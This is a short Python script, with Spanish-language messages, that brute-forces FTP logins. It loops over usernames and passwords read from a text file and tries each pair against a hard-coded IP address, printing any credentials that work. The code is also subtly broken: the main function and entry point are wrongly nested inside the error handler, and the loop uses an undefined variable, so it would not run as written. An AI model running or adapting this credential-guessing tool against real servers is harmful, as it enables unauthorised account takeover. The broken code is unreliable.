import ftplib

def brute(ip,user,password):
    ftp = ftplib.FTP(ip)

    try:
        ftp.login(user,password)
        ftp.quit()
        print(f'User {user}:{password}')

    except:
        print('fallo de autenticacion')

        def main():
            ip = '198.168.8.6' #test
            users = open('User_password.txt','r')
            users = users.read().split('\n')
            passwords = open('User_password.txt')
            passwords = passwords.read().split('\n')

            for usuario in usuarios:
                for pasw in passwords:
                    brute(ip,usuario,pasw)

                if __name__ == '__main__':
                    try:
                        main()
                    except KeyboardInterrupt:
                        exit()